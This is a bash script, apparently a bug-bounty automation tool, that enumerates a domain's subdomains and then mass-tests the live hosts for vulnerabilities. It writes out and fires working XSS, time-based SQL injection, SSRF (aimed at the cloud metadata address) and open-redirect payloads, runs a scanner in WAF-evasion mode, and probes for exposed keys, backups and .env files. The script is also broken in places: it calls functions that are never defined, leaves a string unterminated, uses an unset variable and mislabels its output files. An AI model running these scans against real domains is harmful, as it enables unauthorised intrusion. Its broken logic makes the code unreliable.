#!/bin/bash

while getopts ":d:" input;do
    case "$input" in 
            d) domain=${OPTARG}
                    ;;
            esac 
    done        
if [ -z "$domain" ]
        then
                echo "please give a domain like \"-d domain.com\""
                exit 1 
fi



    mkdir -p .tmp
    mkdir -p database
    mkdir -p database/.gf
    mkdir -p database/dirs
    mkdir -p vulns
    mkdir -p 2> /dev/null
    mkdir -p .json

    ##SUBDOMAIN ENUMERATION
    
    curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | grep -o "\w.*$domain" | anew -q .tmp/cert.list
    curl -s "https://api.hackertarget.com/hostsearch/?q=$domain" | grep -o "\w.*$domain" | anew -q .tmp/htarget.list
    curl -s "https://riddler.io/search/exportcsv?q=pld:$domain" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep -o "\w.*$domain" | anew -q .tmp/riddler.list
    assetfinder --subs-only $domain | anew -q .tmp/assetfinder.list
    amass enum -passive -d $domain -o .tmp/amass.list &> /dev/null
    crobat -s $domain | anew -q .tmp/crobat.list

    timeout 50m ffuf -u http://FUZZ.$domain/ -t 100 -p '1.0-2.0' -w ~/wordlists/subdomains.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" -mc 200 -r -o .tmp/ffuf.json -s 2> /dev/null &> /dev/null
    timeout 50m gobuster dns -d $domain --no-error -z -q -t 100 -w ~/wordlists/subdomains.txt 2> /dev/null | sed 's/Found: //g' | anew -q .tmp/gobuster.list
    timeout 50m amass enum -active -brute -w ~/wordlists/subdomains.txt -d $domain -o .tmp/amassact.list &> /dev/null
    cat .tmp/ffuf.json 2> /dev/null | jq -r '.results[] | .host' 2> /dev/null | anew -q .tmp/ffuf.list && rm -rf .tmp/ffuf.json

    ##SUBD_SCND
    cat .tmp/*.list | grep -v "*" | sed '/@\|<BR>\|\_\|*/d' | grep "$domain" | anew -q .tmp/domains
    xargs -a .tmp/domains -P 50 -I % bash -c "assetfinder --subs-only % | anew -q .tmp/seconddomains.list" 2> /dev/null; timeout 30m xargs -a .tmp/domains -P 10 -I % bash -c "amass enum -passive -d %" 2> /dev/null | anew -q .tmp/seconddomains.list

    ##FILTERING DOMAINS
    
     cat .tmp/*.list | grep -v "*" | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt
   
     cat .tmp/*.list | grep -v "*" | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt
    

    ##WEB PROBING AND SCREENSHOT
    naabu -retries 3 -r ~/wordlists/resolvers.txt -l database/subdomains.txt -p -silent -no-color 2> /dev/null | anew -q database/ports.txt
    cat database/ports.txt | httprobe -prefer-https | anew -q database/lives.txt
    xargs -a database/lives.txt -P 50 -I % bash -c "echo % | aquatone -chrome-path $CHROME_BIN -out database/screenshots/ -threads 10 -silent" 2> /dev/null &> /dev/null
    cat database/lives.txt | python3 -c "import sys; import json; print (json.dumps({'liveurls':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/liveurls.json &> /dev/null
    cat database/subdomains.txt | python3 -c "import sys; import json; print (json.dumps({'subdomains':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/subdomains.json &> /dev/null
    cat database/ports.txt | python3 -c "import sys; import json; print (json.dumps({'ports':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/ports.json &> /dev/null

    ##SUBD_SCAN
    
    echo -e "$domain" | tr -d '\n' | pv -qL 4; 
    SUBD_PASV
    SUBD_ACTV
    SUBD_SCND
    SUBD_CHCK
    cat database/lives.txt 2> /dev/null
    

    agnee -d $domain -q -o database/dorks.txt -p 4
    timeout 50m gospider -S database/lives.txt -d 10 -c 20 -t 50 -K 3 --no-redirect --js -a -w --blacklist ".(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt)" --include-subs -q -o .tmp/gospider 2> /dev/null | anew -q .tmp/gospider.list
    xargs -a database/lives.txt -P 50 -I % bash -c "echo % | waybackurls" 2> /dev/null | anew -q .tmp/waybackurls.list
    xargs -a database/lives.txt -P 50 -I % bash -c "echo % | gau --blacklist eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt --retries 3 --threads 50" 2> /dev/null | anew -q .tmp/gau.list 2> /dev/null &> /dev/null
    cat .tmp/gospider.list .tmp/gau.list .tmp/waybackurls.list 2> /dev/null | sed '/\[/d' | grep $DM | sort -u | uro | anew -q database/urls.txt # <-- Filtering duplicate and common endpoints
    cat database/urls.txt | python3 -c "import sys; import json; print (json.dumps({'endpoints':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/urls.json &> /dev/null

    ##FILTERING ENDPOINTS USING PATTERNS
    gf xss database/urls.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | anew -q database/.gf/xss.list
    gf lfi database/urls.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | anew -q database/.gf/lfi.list
    gf rce database/urls.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | anew -q database/.gf/rce.list
    gf ssrf database/urls.txt | sed "s/'\|(\|)//g" | bhedak "http://169.254.169.254/latest/meta-data/hostname" 2> /dev/null | anew -q database/.gf/ssrf.list
    gf ssti database/urls.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | anew -q database/.gf/ssti.list
    gf sqli database/urls.txt | sed "s/'\|(\|)//g" | bhedak "(select(0)from(select(sleep(5)))v)" 2> /dev/null | anew -q database/.gf/sqli.list
    gf redirect database/urls.txt | sed "s/'\|(\|)//g" | bhedak "http://www.evil.com/" 2> /dev/null | anew -q database/.gf/redirect.list

    xargs -a database/.gf/xss.list -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | grep "< >\|\"" | awk '{print $2}' | anew -q .tmp/xssp.list
    cat .tmp/xssp.list 2> /dev/null | bhedak "\">/><svg/onload=confirm(document.domain)>" 2> /dev/null | anew -q .tmp/xss.txt

    echo -e "" tr -d '\n' | pv -qL 6; echo -e " STARTING INJECTION VULNERABILITY SCANNING ON "

    crlfuzz -l database/lives.txt -c 50 -s | anew vulns/crlf.txt | notify -silent &> /dev/null
    cat vulns/crlf.txt 2> /dev/null
    cat vulns/crlf.txt 2> /dev/null | python3 -c "import sys; import json; print (json.dumps({'vuln_crlf':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/crlf.json &> /dev/null

    cat database/urls.txt | cut -d"?" -f1 | cut -d"=" -f1 | grep -iaE "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.tmp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" | httpx -silent -follow-host-redirects | anew -q vulns/files.txt &> /dev/null
    cat vulns/files.txt 2> /dev/null | python3 -c "import sys; import json; print (json.dumps({'sensitive':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/files.json &> /dev/null

    xargs -a .tmp/xss.txt -P 50 -I % bash -c "curl -s -L -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"<svg/onload=confirm(document.domain)>\" && echo -e \"[POTENTIAL XSS] - % \n \"" 2> /dev/null | grep "POTENTIAL XSS" | anew vulns/xss.txt | notify -silent &> /dev/null
    cat vulns/xss.txt 2> /dev/null
    cat vulns/xss.txt 2> /dev/null | python3 -c "import sys; import json; print (json.dumps({'vuln_xss':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/xss.json &> /dev/null

    xargs -a database/.gf/ssrf.list -P 50 -I % bash -c "curl -ks -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"compute.internal\" && echo -e \"[POTENTIAL SSRF] - % \n \"" 2> /dev/null | grep "POTENTIAL SSRF" | anew vulns/ssrf.txt | notify -silent &> /dev/null
    cat vulns/ssrf.txt 2> /dev/null
    cat vulns/ssrf.txt 2> /dev/null | python3 -c "import sys; import json; print (json.dumps({'vuln_ssrf':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/ssrf.json &> /dev/null

    xargs -a database/.gf/redirect.list -P 50 -I % bash -c "curl -s -iL -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"Evil.Com - We get it...Daily\" && echo -e \"[POTENTIAL REDIRECT] - % \n \"" 2> /dev/null | grep "POTENTIAL REDIRECT" | anew vulns/redirect.txt | notify -silent &> /dev/null
    cat vulns/redirect.txt 2> /dev/null
    cat vulns/redirect.txt 2> /dev/null | python3 -c "import sys; import json; print (json.dumps({'vuln_redirect':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/redirect.json &> /dev/null

    timeout 50m xargs -a database/.gf/sqli.list -P 50 -I % bash -c "echo % | jeeves --payload-time 5" | grep "Vulnerable To" | anew vulns/sqli.txt | notify -silent 2> /dev/null &> /dev/null
    cat vulns/sqli.txt 2> /dev/null
    cat vulns/sqli.txt 2> /dev/null | python3 -c "import sys; import json; print (json.dumps({'vuln_redirect':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/redirect.json &> /dev/null

    dalfox file .tmp/xssp.list --silence --no-color --waf-evasion --no-spinner --mass --mass-worker 100 --skip-bav -w 100 -H "X-Bugbounty: Testing" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" 2> /dev/null | anew vulns/dalfoxss.txt | notify -silent &> /dev/null
    cat vulns/dalfoxss.txt 2> /dev/null
    cat vulns/dalfoxss.txt 2> /dev/null | python3 -c "import sys; import json; print (json.dumps({'dalfox':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/dalfox.json &> /dev/null

    cat .json/*.json | jq -s 'add' 2> /dev/null | tee output.json &> /dev/null

    echo -e ""
    echo -e "$ SCANNING COMPLETED SUCCESSFULLY ON $domain"
    echo -e " notify -silent
    SUBD_SCAN 2> /dev/null
    WEBC_RAWL 2> /dev/null
    NUCL_SCAN 2> /dev/null
    VULN_SCAN 2> /dev/null
    FUZZ_DIRS 2> /dev/null
    SEND_NOTE 2> /dev/null

  while true
       do
            INFOM 
            MAKDR
            VAULT
       exit   
  done





























